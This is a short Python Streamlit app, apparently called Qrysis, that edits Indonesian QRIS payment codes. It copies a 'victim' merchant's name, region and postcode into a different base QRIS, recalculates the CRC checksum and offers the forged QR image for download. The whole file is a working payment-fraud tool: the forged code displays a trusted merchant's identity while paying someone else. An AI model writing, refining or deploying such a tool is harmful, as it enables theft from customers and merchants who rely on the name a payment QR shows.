import streamlit as st
import qrcode, io
from pyzbar.pyzbar import decode
from PIL import Image
import numpy as np

def parse(qris):
    index, data = 0, {}
    while index < len(qris):
        obj = qris[index:index+2]
        length = int(qris[index+2:index+4])
        value = qris[index+4:index+4+length]
        data[obj] = value
        index += 4 + length
    return data

def modify(data, name=None, region=None, postcode=None):
    if name: data['59'] = name
    if region: data['60'] = region
    if postcode: data['61'] = postcode
    altered = ''
    for obj, value in data.items():
        if obj == '63': continue
        length = f"{len(value):02}"
        altered += f"{obj}{length}{value}"
    altered += '6304'
    altered += checksum(altered)
    return altered

def checksum(data):
    bytes = data.encode('utf-8')
    crc, poly = 0xFFFF, 0x1021
    for byte in bytes:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000: crc = (crc << 1) ^ poly
            else: crc <<= 1
            crc &= 0xFFFF
    return f"{crc:04X}"

def create(data):
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill='black', back_color='white')
    return img

st.title('Qrysis - QRIS Editor')
baseqr = st.file_uploader("Base QRIS", type=["png", "jpeg", "jpg"])
if baseqr:
    base_data = parse(decode(np.array(Image.open(baseqr)))[0].data.decode('utf-8'))
    st.write(base_data if baseqr else "Base QRIS not detected")
    victim = st.file_uploader("Victim QRIS", type=["png", "jpeg", "jpg"])
    
    if victim:
        victim_data = parse(decode(np.array(Image.open(victim)))[0].data.decode('utf-8'))
        st.write(victim_data if victim else "Victim QRIS not detected")
        name, region, postcode = victim_data.get('59'), victim_data.get('60'), victim_data.get('61')
    else:
        name = st.text_input("Merchant Name", base_data.get('59', ''))
        region = st.text_input("Region", base_data.get('60', ''))
        postcode = st.text_input("Postal Code", base_data.get('61', ''))
    if name and region and postcode:
        st.warning("QRIS Altered")
        altered_data = modify(base_data, name, region, postcode)
        st.write(parse(altered_data))
        qr_img = create(altered_data)
        img_byte_arr = io.BytesIO()
        qr_img.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        st.image(img_byte_arr, caption=f"{name}")
        st.download_button("Download Altered QRIS", img_byte_arr, f"{name}.png")